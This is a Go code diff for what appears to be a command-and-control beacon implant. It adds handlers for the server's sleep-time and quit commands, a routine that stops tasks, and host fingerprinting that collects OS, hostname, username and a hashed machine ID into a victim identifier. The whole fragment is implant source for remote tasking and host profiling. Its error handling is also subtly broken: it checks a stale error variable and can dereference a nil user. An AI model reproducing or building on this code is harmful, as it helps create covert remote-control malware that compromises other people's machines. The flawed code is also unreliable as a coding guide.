@@ -139,3 +139,80 @@ func main() {
 
 			case communication.SetSleeptime:
 				// change sleeptime
+
+				if config.DEBUG {
+					log.Println("setSleeptime")
+				}
+				newsleeptime, err := strconv.Atoi(beaconresponse.Commands[i].Args[0])
+
+				if err != nil {
+					if config.DEBUG {
+						log.Printf("Error converting newsleeptime to int (%s)", err)
+					}
+					continue
+				}
+
+				config.Sleeptime = newsleeptime
+
+			case communication.Quit:
+				// should stop
+				if config.DEBUG {
+					log.Println("Quit")
+				}
+				stoptasks()
+				return
+			default:
+				if config.DEBUG {
+					log.Println("UNKNOWN Command: " + beaconresponse.Commands[i].Command)
+				}
+			}
+		}
+	}
+}
+
+// stop all tasks
+func stoptasks() {
+	for i := 0; i < len(taskchannels); i++ {
+		close(taskchannels[i]) // stop all running goroutines
+	}
+
+	// remove the closed channels from the array
+	taskchannels = []chan struct{}{}
+}
+
+// Init facts about this host
+func initVars() {
+
+	// get OS info
+	beaconing.OSINFO = runtime.GOOS + " " + runtime.GOARCH
+
+	// get hostname
+	hostname, err := os.Hostname()
+	if config.DEBUG {
+		if err != nil {
+			log.Printf("Could not get hostname (%s)", err)
+		}
+	}
+	beaconing.HOSTNAME = hostname
+
+	// get current user
+	user, err := user.Current()
+	if config.DEBUG {
+		if err != nil {
+			log.Printf("Could not get current user (%s)", err)
+		}
+	}
+	beaconing.USERNAME = user.Username
+
+	// generate UID
+	id, _ := machineid.ID()
+	if config.DEBUG {
+		if err != nil {
+			log.Printf("Could not generate machine id (%s)", err) // this could be caused if we're inside docker
+		}
+	}
+
+	mac := hmac.New(sha256.New, []byte(id))
+	mac.Write([]byte(user.Username + hostname))
+	beaconing.UID = fmt.Sprintf("%x", mac.Sum(nil))
+}
